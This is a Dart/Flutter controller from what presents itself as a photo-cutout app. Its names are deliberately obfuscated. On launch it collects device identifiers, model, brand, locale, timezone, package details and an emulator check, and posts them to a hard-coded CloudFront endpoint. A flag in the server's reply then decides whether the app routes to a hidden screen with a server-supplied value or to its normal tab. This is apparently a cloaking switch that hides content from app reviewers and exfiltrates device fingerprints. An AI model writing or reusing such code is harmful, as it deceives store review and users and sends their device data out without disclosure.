import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class CutoutBurstTextLogic extends GetxController {

  var mbneuprf = RxBool(false);
  var izfctqa = RxBool(true);
  var ltwmzipr = RxString("");
  var laspr = RxBool(false);
  var giuqzfsh = RxBool(true);
  final molrbx = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ofvt();
  }


  Future<void> ofvt() async {
    laspr.value = true;
    giuqzfsh.value = true;
    izfctqa.value = false;

    molrbx.post("https://dlpjuneuydaw3.cloudfront.net/HwEIoTWGIfao",data: await jstayq()).then((value) {
      var rafsz = value.data["rafsz"] as String;
      var xemt = value.data["xemt"] as bool;
      if (xemt) {
        ltwmzipr.value = rafsz;
        oxrpuf();
      } else {
        hjsin();
      }
    }).catchError((e) {
      izfctqa.value = true;
      giuqzfsh.value = true;
      laspr.value = false;
    });
  }

  Future<Map<String, dynamic>> jstayq() async {
    final DeviceInfoPlugin dxzimgr = DeviceInfoPlugin();
    PackageInfo pxygkch_glyzcox = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var tzgr = Platform.localeName;
    var mFcY = currentTimeZone;

    var gZqG = pxygkch_glyzcox.packageName;
    var jBhY = pxygkch_glyzcox.version;
    var pHID = pxygkch_glyzcox.buildNumber;

    var IKNzrja = pxygkch_glyzcox.appName;
    var PcYnjp = "";
    var CESgIxO  = "";
    var WJNd = "";
    var etbl = "";
    var rmdxz = "";
    var jactud = "";
    var ufsrb = "";
    var tmejyusi = "";


    var xTAvIBWw = "";
    var EAqnXHS = false;

    if (GetPlatform.isAndroid) {
      xTAvIBWw = "android";
      var jhnqie = await dxzimgr.androidInfo;

      WJNd = jhnqie.brand;

      PcYnjp  = jhnqie.model;
      CESgIxO = jhnqie.id;

      EAqnXHS = jhnqie.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      xTAvIBWw = "ios";
      var pygjmhsu = await dxzimgr.iosInfo;
      WJNd = pygjmhsu.name;
      PcYnjp = pygjmhsu.model;

      CESgIxO = pygjmhsu.identifierForVendor ?? "";
      EAqnXHS  = pygjmhsu.isPhysicalDevice;
    }
    var res = {
      "IKNzrja": IKNzrja,
      "jBhY": jBhY,
      "gZqG": gZqG,
      "xTAvIBWw": xTAvIBWw,
      "PcYnjp": PcYnjp,
      "mFcY": mFcY,
      "WJNd": WJNd,
      "CESgIxO": CESgIxO,
      "tmejyusi" : tmejyusi,
      "tzgr": tzgr,
      "EAqnXHS": EAqnXHS,
      "etbl" : etbl,
      "pHID": pHID,
      "rmdxz" : rmdxz,
      "jactud" : jactud,
      "ufsrb" : ufsrb,

    };
    return res;
  }

  Future<void> hjsin() async {
    Get.offNamed("/cutout_burst_tab");
  }

  Future<void> oxrpuf() async {
    Get.offNamed("/cutout_burst_trim_east");
  }

}
